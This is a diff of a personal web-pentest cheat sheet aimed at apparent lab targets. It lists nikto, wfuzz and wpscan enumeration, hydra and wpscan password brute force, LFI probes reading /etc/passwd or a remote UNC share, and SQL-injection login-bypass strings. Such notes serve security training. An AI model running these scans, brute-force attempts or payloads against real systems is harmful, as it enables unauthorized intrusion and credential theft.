@@ -1,4 +1,6 @@
+=================================== 
 Webscans
+
 export URL="http://192.168.200.5:80" 
 nikto --url $URL 
 dirsearch -u $URL -w $medium -e ,,txt,cfg,bak,html,php,asp,aspx -r -f -t 50 -x 400
@@ -16,13 +18,14 @@ wfuzz -c -z file,$raft-medium-files --hc 404 --hh 4772 "$URL"
 FUZZ Directories 
 export URL="http://dcbob:80/FUZZ/"  
 export URL="http://192.168.200.5:80/FUZZ/"  
-wfuzz -c -z file,$raft-medium-directories --hc 404 --hh 4772"$URL" 
+wfuzz -c -z file,$raft-medium-directories --hc 404 --hh 4772 "$URL" 
 
 FUZZ Vhosts
-wfuzz -w $subtopmill -c -f wfuzz.sub -Z -u 'http://cronos.htb' -H 'Host: FUZZ.cronos.htb' -t 42 --hl 1
+wfuzz -w $subtopmill -c -f wfuzz.sub -Z -u 'http://dcbob.com' -H 'Host: FUZZ.dcbob.com' -t 42 --hl 1
 
 FUZZ URL
-wfuzz -z range,0-10 --hl 97 http:/192.168.200.5:80/listproducts.php?cat=FUZZ
+export URL="http://dcbob:80/listproducts.php?cat=FUZZ"  
+wfuzz -z range,0-10 --hl 97 "$URL"
 
 Wordpress Plugins/Themes
 wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t 
@@ -35,3 +38,157 @@ echo jerry >> users
 Wordpress Brute Force 
 cewl $URL -m 5 -w cewl.txt 2>/dev/null 
 wpscan --url $URL --disable-tls-checks -U users -P cewl.txt/$rockyou 
+
+
+=================================== 
+Summary
+
+Follow links, paths
+Find clues, usernames, passwords, Login/Admin pages
+Login defaults/guessing 
+Burp - Can find secret redirects 
+Find Forms, Inputs, PHP, CGI 
+Forms/php = SQLi or WebInjections 
+Version of package (Wordpress, Drupal, Etc)
+
+
+=================================== 
+Browse 
+
+Follow links, paths, clues
+View Source (Ctrl-U)
+Find package type (Wordpress, Drupal, etc)
+Hidden comments
+Tweak Comments: Firefox > Inspect Element > R.Click "Edit as HTML" 
+
+http://192.168.200.5
+https://192.168.200.5 
+https://192.168.200.5:8080 
+https://192.168.200.5:8080/robots.txt 
+https://192.168.200.5:8080/~mike
+
+curl -A "GoogleBot" 192.168.200.5 
+curl -i 192.168.200.5             ..headers
+curl -iL 192.168.200.5            ..redirects
+curl -iL http://192.168.200.5     ..bypass WAF
+curl -v –request OPTIONS http://  ..WebDAV Options
+
+
+=================================== 
+Checks
+
+ssl certificate - user/email/vhosts
+Cookie Manager - interesting
+Wappalyzer - technology
+
+
+=================================== 
+LFI
+
+Watch for path that looks like a file/folder
+File/Folders in Path  = Directory Traversal
+path/slash/files/../  = LocalFileInclusion 
+
+http://web/dept/manage.php?notes=files/comments.txt 
+http://web/menu.php?file=menu.php
+http://web/dept/?lang=/etc/passwd
+http://web/dept/?lang=/windows/system32/drivers/etc/hosts 
+http://web/dept/?lang=\\192.168.162.46\hello.txt   
+
+ 
+=================================== 
+Admin/Logins
+
+Guess: admin:admin 
+Google Default Password
+Reuse (if you've found user/pass) 
+MyApp Authentication Bypass (google) 
+MyApp SQLIi bypass (google) 
+Parameters in URL (might be SQLi)
+Brute with hydra (esp if you have username) 
+
+
+=================================== 
+Exploits 
+
+google 'coldfusion 8 exploits'
+searchsploit/exploitdb/blogs/github 
+Known: LFI - SQLi - Directory Traversal 
+EternalBlue/Shellshock/Heartbleed (Well-Known) 
+Remote Code Execution (RCE) 
+CRM/Wordpress= Vulns, Addon, Upload, Theme 
+
+
+=================================== 
+Inspect Page Content 
+
+Settings > Web Dev > Debugger (Ctrl-Shift-K) 
+Resources, comments, controls, JavaScript, hidden inputs 
+Firefox > PrettyPrint {} (bottom-button) 
+
+Inspector 
+Finds hidden html fields 
+Email address Field > R.Click Inspect Element 
+
+
+===================================  
+Server Response 
+
+View Requests and Responses 
+Firefox “Network” Tool (Tab) 
+Web Developer > Network 
+Refresh page ..to see new traffic to the 'Contact' page 
+Click Contact.html 'get' request - Headers > Server Version! 
+ 
+Weird Headers 
+Non-standard Headers start with 'X-'
+X-Powered-By, x-amz-cf-id, X-Aspnet-Version 
+These names could reveal additional information for exploit 
+Ex: 'x-amz-cf-id' header = Application uses Amazon CloudFront 
+ 
+ 
+=================================== 
+Brute
+
+Login hydra (especially if you have username) 
+Burp Pw Guess (even with protections) 
+ 
+=================================== 
+Scrape
+
+cewl 192.168.200.5 --e --email_file emails.txt 
+cewl 192.168.200.5 -m 4 -d 3 -w cewl6deep5.txt 
+sort dict.txt | uniq > dict.txt  
+echo 'foundthis' >> dict.txt               
+echo 'hostname' >> dict.txt   
+ 
+=================================== 
+SQL Injection 
+
+' 
+" 
+; 
+admin' -- 
+' OR 1=1 -- 
+" OR 1=1 --  
+' OR 1=1;# 
+" OR 1=1 #  
+',convert(int@@version))-- 
+
+=================================== 
+PHP SQLi Parameter
+
+View Page Source > Ctrl-F "?"  
+http://192.168.200.5/room.php?cod=1'
+Error/no-graphic = perfect! 
+
+=================================== 
+Other
+
+Upload-Pages are full of holes
+Burp to find secret pages 
+
+
+=================================== 
+Consider
+mxnmap mxcurls 
